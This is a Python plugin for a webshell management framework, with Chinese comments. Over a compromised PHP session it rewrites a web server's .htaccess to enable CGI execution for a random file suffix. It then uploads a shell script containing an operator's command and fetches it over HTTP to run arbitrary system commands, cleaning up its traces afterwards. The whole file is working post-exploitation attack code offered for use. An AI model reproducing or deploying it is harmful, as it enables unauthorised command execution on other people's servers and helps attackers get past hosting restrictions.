import argparse, os, json, base64
import re
from typing import List, Union
from api import  Plugin, Command, CommandExecutor, CommandReturnCode,  Cmdline, CommandType, SessionType, Session, logger, tablor, utils
from api import OSType, colour
import requests, time
from urllib.parse import urljoin

def get_plugin_class():
    return HTAccessExecPlugin

class HTAccessExecPlugin(Plugin, Command, CommandExecutor):
    name = ".htaccess执行系统命令"
    description = "使用.htaccess执行系统命令，一般需要web容器（如；Apache）支持，且需要开启选项`AllowOverride All`"
    command_name = 'exec_by_htaccess'
    command_type = CommandType.SYSTEM_COMMAND
    supported_session_types = [SessionType.PHP]

    def __init__(self):
        super().__init__()
        self.parse = argparse.ArgumentParser(prog=self.command_name, description=self.description)
        subparse = self.parse.add_subparsers()

        exec_parse = subparse.add_parser('exec', help="执行系统命令")
        exec_parse.add_argument('cmd', help="要执行的系统命令", nargs='?')
        exec_parse.add_argument('-v', '--verbose', help="显示命令执行过程", action='store_true')
        exec_parse.set_defaults(func=self._exec)

        config_parse = subparse.add_parser('config', help="配置选项")
        config_parse.add_argument('-l', '--show-config', help="显示当前配置信息", action='store_true')
        config_parse.add_argument('-r', '--refresh', help="刷新当前配置，这将清理生成的.htaccess文件", action='store_true')
        config_parse.add_argument('-d', '--htaccess-dir', help="要生成.htaccess文件的目录(网站绝对路径)，默认在网站根目录")
        config_parse.add_argument('-c', '--cmd-dir', help="要生成命令文件的目录(网站绝对路径)，置空时则总是和.htaccess文件同目录（默认）")
        config_parse.add_argument('-t', '--type', help="指定容器是通过什么方式启动的，默认CGI方式", choices=['CGI', 'FastCGI'])
        config_parse.set_defaults(func=self._config)

        self.help_info = self.parse.format_help()

        self.htaccess_dir = '/' # 远程.htaccess文件所在目录(网站绝对路径)
        self.cmd_dir = '' # 远程命令文件所在目录(网站绝对路径)
        self.start_type = 'CGI' # web容器启动方式

        self.suffix = '' # 命令文件后缀
        self.old_htaccess_content = b'' # 老的htaccess文件内容

    def on_loading(self, session: Session) -> bool:
        return super().on_loading(session)

    

    def _exec(self, args:argparse.Namespace)->CommandReturnCode:
        cmd = args.cmd
        ret = self.exec(cmd.encode(), self.session.options.get_option('timeout').value, args.verbose)
        if ret is None:
            logger.error(f"执行命令`{cmd}`失败！")
            return CommandReturnCode.FAIL
        print(ret.decode(self.session.options.get_option('encoding').value, errors='ignore'), end='', flush=True)
        return CommandReturnCode.SUCCESS

    def _config(self, args:argparse.Namespace)->CommandReturnCode:  
        if args.refresh:
            self.clean()
            
        locked = True if self.suffix else False
        if locked:
            logger.warning("当前配置已被锁定！刷新后可解开")

        if args.htaccess_dir and not locked:
            self.htaccess_path = args.htaccess_dir.rstrip('/')
            logger.info(f"htaccess_dir => {self.htaccess_dir}")
        
        if args.type and not locked:
            self.start_type =  args.type
            logger.info(f"start_type => {self.start_type}")

        if args.cmd_dir and not locked:
            self.cmd_dir = args.cmd_dir.rstrip('/')
            logger.info(f"cmd_dir => {args.cmd_dir}")

        # 显示配置信息
        table = [
            ['.htaccess文件所在目录', self.htaccess_dir],
            ['apache启动方式', self.start_type],
            ['命令文件所在目录', self.cmd_dir if self.cmd_dir else "跟随.htaccess文件"],
            ['状态',  colour.colorize('锁定', 'bold', 'red') if locked else colour.colorize('初始化', 'bold', 'green')]
        ]
        print(tablor(table, False, True))

        return CommandReturnCode.SUCCESS

    def clean(self)->bool:
        '''清理产生的htaccess文件
        '''
        if self.suffix:
            sep = self.session.server_info.sep
            cmd_dir = self.cmd_dir
            if not cmd_dir:
                cmd_dir =  self.htaccess_dir
            htdir = self.session.server_info.www_root+sep+self.htaccess_dir.replace('/', sep).lstrip(sep)
            cmd_dir = self.session.server_info.www_root+sep+cmd_dir.replace('/', sep).lstrip(sep) # 文件路径
            ret = self.session.evalfile('clean', dict(htdir=htdir, htdata=self.old_htaccess_content, cmddir=cmd_dir, suffix=self.suffix), find_dir=True)
            if ret is None:
                logger.error("清理.htaccess文件失败！")
                return False

        self.suffix = ''
        self.old_htaccess_content = b''
        logger.info("清理.htaccess文件成功！")
        return True
    
    def exec(self, cmd: bytes, timeout: float, verbose=False) -> Union[bytes, None]:
        sep = self.session.server_info.sep
        cmd_interpreter = 'C:/Windows/System32/cmd.exe /c' if self.session.server_info.os_type == OSType.WINDOWS else '/bin/sh'
        # 新增或改写.htaccess文件,并在成功时写入命令文件
        if not self.suffix:
            self.suffix = utils.random_str()
            htaccess_content = 'Options ExecCGI\nAddHandler cgi-script .%s\n'%self.suffix
            if self.start_type == 'FastCGI':
                htaccess_content = 'Options +ExecCGI\nAddHandler fcgid-script .%s\nFcgidWrapper "%s" .%s\n'%(self.suffix, cmd_interpreter, self.suffix)
            htdir = self.session.server_info.www_root+sep+self.htaccess_dir.replace('/', sep).lstrip(sep)
            ret = self.session.evalfile('htaccess', dict(htdata=htaccess_content, htdir=htdir), find_dir=True)
            if ret is None:
                return None
            ret = json.loads(ret)
            code = ret['code']
            if code == -1:
                if verbose:
                    logger.error(f"`{htdir}`目录下.htaccess文件已存在，但不可读！！")
                return None
            elif code == -2:
                if verbose:
                    logger.error(f"`{htdir}`目录下.htaccess文件已存在，但不可写！！")
                return None
            elif code == -3:
                if verbose:
                    logger.error(f"`{htdir}`目录下.htaccess文件不存在！但该目录无法创建文件！！")
                return None
            elif code == 0:
                if verbose:
                    logger.info(f"`{htdir}`目录下.htaccess文件创建成功！！")
            elif code == 1:
                self.old_htaccess_content = base64.b64decode(ret['msg'].encode()) #保存原始数据
                if verbose:
                    logger.info(f"`{htdir}`目录下.htaccess文件已存在，并添加配置成功！！")


        # 创建命令文件
        cmd_dir = self.cmd_dir
        if not cmd_dir:
            cmd_dir =  self.htaccess_dir
        cmd_path = urljoin(cmd_dir, utils.random_str()+'.'+self.suffix) # URL路径
        cmdpath = self.session.server_info.www_root+sep+cmd_path.replace('/', sep).lstrip(sep) # 文件路径
        cmdir = self.session.server_info.www_root+sep+cmd_dir.replace('/', sep).lstrip(sep) # 文件路径
        del_cmd = 'del' if self.session.server_info.os_type == OSType.WINDOWS else 'rm'
        cmddata = r'''#!%s
echo "Content-Type: text/html"
%s
cd %s
%s
cd %s
%s *.%s
        '''%(cmd_interpreter, "echo.\necho." if self.session.server_info.os_type == OSType.WINDOWS else 'echo -e "\\n\\n"', 
            self.session.server_info.pwd, cmd.decode(), cmdir, del_cmd, self.suffix)
        ret = self.session.evalfile('cmd', dict(cmdpath=cmdpath, cmddata=cmddata), find_dir=True)
        if ret is None:
            if verbose:
                logger.error("写入命令文件失败！")
            return None
        ret = int(ret)
        if ret == -1:
            if verbose:
                logger.error("命令文件无法在指定目录中创建，无写入权限！")
            return None
        elif ret == 0:
            if verbose:
                logger.info(f"命令文件`{cmdpath}`写入成功！")

        # 访问命令文件并执行命令
        if timeout<0:
            timeout = self.session.options.get_option('timeout').value
        elif timeout == 0:
            timeout = None
        timeout = (10, timeout)
        ret = requests.get(urljoin(self.session.server_info.website, cmd_path), verify=False, timeout=timeout)
        result = ret.content[2:]
        
        return result

    def run(self, cmdline: Cmdline) -> CommandReturnCode:
        args = self.parse.parse_args(cmdline.options)
        if hasattr(args, 'func'):
            return args.func(args)
        logger.error('未指定子命令！')
        return CommandReturnCode.FAIL

    def on_destroy(self):
        if self.suffix:
            self.clean()

        self.session.save_json(self.command_name, {
            'htaccess_dir':self.htaccess_dir,
            'start_type':self.start_type,
            'cmd_dir':self.cmd_dir
        })

    def on_loaded(self):
        self.session.register_complete_func(self.docomplete)

        data = self.session.load_json(self.command_name)
        if data:
            self.htaccess_dir = data.get('htaccess_dir', '/')
            self.start_type = data.get('start_type', 'CGI')
            self.cmd_dir = data.get('cmd_dir', '')

    def docomplete(self, text: str)-> List[str]:
        result = []
        match = re.fullmatch(r'(%s +)(\w*)'%self.command_name, text)
        if match:
            for key in ['config', 'exec']:
                if key.startswith(match.group(2).lower()):
                    result.append(match.group(1)+key+' ')
        return result